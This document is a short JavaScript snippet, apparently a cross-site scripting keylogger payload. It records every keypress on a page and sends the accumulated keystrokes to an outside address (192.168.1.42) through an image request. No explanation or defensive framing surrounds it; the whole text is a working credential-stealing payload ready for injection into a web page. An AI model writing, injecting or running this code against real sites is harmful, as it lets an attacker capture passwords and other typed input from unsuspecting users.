<script>
  var k = "";
  document.onkeypress = function(e){
    e = e || window.event;
    k += e.key;
    var i = new Image();
    i.src = "http://192.168.1.42/" + k;
  };
  
</script>
